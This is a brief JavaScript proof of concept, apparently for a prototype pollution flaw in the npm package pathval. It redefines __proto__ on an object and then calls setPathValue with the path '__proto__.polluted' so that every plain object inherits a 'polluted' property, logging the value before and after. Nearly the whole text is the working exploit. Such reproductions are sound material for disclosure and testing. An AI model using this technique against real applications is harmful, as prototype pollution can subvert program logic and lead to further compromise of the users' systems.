var obj = {};
obj.__proto__.polluted = undefined;
Object.defineProperty(obj, '__proto__', {
    value: obj.__proto__,
    writable: true,
    enumerable: true,
    configurable: true
});
var pathval = require('pathval');
var obj = {};
console.log({}.polluted);
pathval.setPathValue(obj, '__proto__.polluted', 'yes');
console.log({}.polluted);